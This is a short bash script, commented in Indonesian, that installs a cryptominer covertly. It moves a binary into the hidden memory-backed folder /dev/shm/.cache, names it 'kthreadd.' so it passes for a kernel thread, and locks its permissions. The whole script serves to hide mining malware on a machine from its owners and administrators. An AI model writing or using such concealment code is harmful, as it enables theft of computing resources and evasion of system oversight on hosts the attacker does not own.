#!/bin/bash

# Nama proses penyamaran
PROC_NAME="kthreadd."

# Folder tersembunyi
MINER_DIR="/dev/shm/.cache"
MINER_BIN="$MINER_DIR/$PROC_NAME"

# Pastikan direktori ada
mkdir -p "$MINER_DIR"

# Pindahkan file miner jika belum ada
if [ ! -f "$MINER_BIN" ]; then
    mv cache "$MINER_BIN"
    chmod 700 "$MINER_BIN"
    echo "Padi berhasil dipindahkan ke $MINER_BIN"
else
    echo "Padi sudah ada di $MINER_BIN"
fi

exit 0
